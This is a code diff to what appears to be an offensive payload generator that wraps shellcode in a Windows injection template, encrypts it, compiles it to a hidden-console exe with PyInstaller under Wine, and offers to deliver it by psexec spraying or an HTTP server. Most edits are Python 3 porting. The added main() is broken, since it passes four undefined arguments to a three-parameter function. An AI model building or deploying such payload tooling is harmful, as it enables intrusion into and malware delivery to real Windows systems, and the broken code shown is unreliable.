@@ -1,6 +1,6 @@
 from lib.main import *
 from lib.payloadextras import *
-#from psexecspray import * #Remove import temporarily
+#from lib.psexecspray import *
 from lib.startmetasploit import *
 from lib.generatepayload import *
 from lib.menu import *
@@ -60,7 +60,7 @@ def askAndReturnModules(shellcode, metasploit_type):
 
 def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
     from lib.menu import clientMenuOptions
-    if len(clientMenuOptions.keys()) > 2:
+    if len(list(clientMenuOptions.keys())) > 2:
         from lib.stager import clientUpload
         if clientUpload(powershellExec=ez2read_shellcode, isExe=True, json='{"type":"", "data":"%s", "sendoutput":"false", "multiple":"true"}'):
             return True
@@ -69,29 +69,31 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
     with open('%s/%s.py' % (payloaddir(), randoFileName), 'w+') as Filesave:
         Filesave.write(do_Encryption(SHELLCODE.injectwindows % (ez2read_shellcode)))
         Filesave.close()
-    print ('[*] Creating Payload using Pyinstaller...')
+    print('[*] Creating Payload using Pyinstaller...')
 
+    #edit payload generation. try to use python3
     p = subprocess.Popen(['wine', os.path.expanduser('~') + '/.win32/drive_c/Python27/python.exe', '/opt/pyinstaller/pyinstaller.py',
                           '%s/%s.py' % (payloaddir(), randoFileName), '--noconsole', '--onefile'], env=dict(os.environ, **{'WINEARCH':'win32','WINEPREFIX':os.path.expanduser('~') + '/.win32'}), bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
     LOADING = Spinner('Generating Payload')
     while p.poll() == None:
         LOADING.Update()
         time.sleep(0.2)
-    print ('\r',)
+    print('\r', end=' ')
     sys.stdout.flush()
-
     payloadstderr = p.stderr.read()
+
     if len(sys.argv) > 1:
         if sys.argv[1] == "-debug":
             sys.stdout.write(payloadstderr)
     try:
         os.rename('dist/%s.exe' % randoFileName, '%s/%s.exe' % (payloaddir(), randoFileName))
     except OSError:
-        print (t.bold_red + "[!] Error while creating payload..." + t.normal)
-        print (payloadstderr)
+        print(t.bold_red + "[!] Error while creating payload..." + t.normal)
+        print(payloadstderr)
         return False
 
-    print (t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir(), randoFileName) + t.normal)
+    print(t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir(), randoFileName) + t.normal)
     CleanUpPayloadMess(randoFileName)
     DoPayloadUpload(randoFileName)
     return True
@@ -111,3 +113,7 @@ def DoPayloadUpload(payloadname):
         DoPsexecSpray(payloaddir() + '/' + payloadname + '.exe')
     elif want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
         FUNCTIONS().DoServe(returnIP(), payloadname, payloaddir(), port=8000, printIt = True)
+
+
+def main():
+    GeneratePayload(ez2read_shellcode,ss,EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])
